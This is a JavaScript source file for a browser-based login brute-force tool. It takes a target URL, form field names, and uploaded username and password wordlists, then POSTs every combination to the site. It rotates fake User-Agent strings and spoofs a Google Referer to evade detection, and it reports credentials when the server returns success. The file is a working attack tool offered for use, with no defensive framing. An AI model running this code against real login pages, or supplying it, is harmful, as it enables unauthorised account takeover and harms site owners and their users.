let stopFlag = false;

function getRandomUserAgent() {
    const userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0.2',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/7.0.5 Safari/537.77.4',
        'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:31.0) Gecko/20100101 Firefox/31.0',
        'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:30.0) Gecko/20100101 Firefox/30.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
        'Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0'
        
        // Add other User-Agents as needed
    ];

    const randomIndex = Math.floor(Math.random() * userAgents.length);
    return userAgents[randomIndex];
}

/*
const outputTextArea = document.getElementById('output');
outputTextArea.addEventListener('input', function () {
    highlightErrors();
});
*/

// Function to highlight occurrences of "Error"
function highlightErrors() {
    const errorText = 'Error';
    const regex = new RegExp(errorText, 'g');
    
    // Wrap each occurrence of "Error" in a span with a specific class
    outputTextArea.innerHTML = outputTextArea.value.replace(regex, match => `<span class="error-text">${match}</span>`);
}


async function startBruteForce() {
    stopFlag = false; // Reset the stop flag
    const website = document.getElementById('website').value;
    const usersel = document.getElementById('usersel').value;
    const passsel = document.getElementById('passsel').value;

    const fileUserInput = document.getElementById('userlist');
    const filePassInput = document.getElementById('passlist');
    const delay = parseInt(document.getElementById('delay').value, 10) || 0;

    const userlist = await readUploadedFile(fileUserInput);
    const passlist = await readUploadedFile(filePassInput);

    const outputTextArea = document.getElementById('output');
    outputTextArea.value = ''; // Clear existing content
    outputTextArea.style.display = 'block'; // Display the textarea during the process

    // Hide Start button and show Stop button
    document.getElementById('startBtn').style.display = 'none';
    document.getElementById('stopBtn').style.display = 'inline-block';

    for (let i = 0; i < userlist.length && !stopFlag; i++) {
        const username = userlist[i].trim();

        for (let j = 0; j < passlist.length && !stopFlag; j++) {
            const password = passlist[j].trim();

            const currentDate = new Date();

            // Get the current time components
            const hours = currentDate.getHours();
            const minutes = currentDate.getMinutes();
            const seconds = currentDate.getSeconds();

            // Format the time as a string
            const currentTime = `${hours}:${minutes}:${seconds}`;

            try {
                const success = await authenticate(username, password, usersel, passsel, website);

                if (success) {
                    outputTextArea.innerHTML += `[${currentTime}] : username=<span class="param-text">${username}</span>, password=<span class="param-text">${password}</span> - <span class="success-text">Authentication failed</span><br/>`;
                    /*outputTextArea.innerHTML += '[#] Happy to help ;)\n';*/
                    scrollToBottom(outputTextArea);
                    return;
                } else {
                    outputTextArea.innerHTML += `[${currentTime}] :username=<span class="param-text">${username}</span>, password=<span class="param-text">${password}</span> - <span class="error-text">Authentication failed</span><br/>`;
                }
            } catch (error) {
                console.error('Error:', error);
                outputTextArea.innerHTML += `[${currentTime}] :username=<span class="param-text">${username}</span>, password=<span class="param-text">${password}</span> - <span class="error-text">${error.message}</span><br/> <br/>`;
            }
            
        
            scrollToBottom(outputTextArea);

            // Check the stop flag every 1000 milliseconds
            await new Promise(resolve => setTimeout(resolve, delay));
        }
    }

    outputTextArea.value += 'No valid credentials found.\n <br/>';

    
    scrollToBottom(outputTextArea);

    // Hide Stop button and show Start button
    document.getElementById('startBtn').style.display = 'inline-block';
    document.getElementById('stopBtn').style.display = 'none';
    
}

function stopBruteForce() {
    stopFlag = true;
}

function scrollToBottom(textarea) {
    textarea.scrollTop = textarea.scrollHeight;
}

async function readUploadedFile(fileInput) {
    return new Promise((resolve, reject) => {
        const file = fileInput.files[0];

        if (!file) {
            reject(new Error(`No file selected for ${fileInput.id}.`));
            return;
        }

        const reader = new FileReader();
        reader.onload = function (e) {
            const content = e.target.result;
            const wordlist = content.split('\n');
            resolve(wordlist);
        };
        reader.readAsText(file);
    });
}

async function authenticate(username, password, usersel, passsel, website) {
    const formBody = new FormData();
    formBody.append(usersel, username);
    formBody.append(passsel, password);

    try {
        const response = await fetch(website, {
            method: 'POST',
            body: formBody,
            headers: {
                'User-Agent': getRandomUserAgent(),
                'Accept-Language': 'en-US,en;q=0.9',
                'Referer': 'https://www.google.com/'
            }
        });

        return response.ok;
    } catch (error) {
        console.error('Authentication error:', error);
        throw error;
    }
}

        
        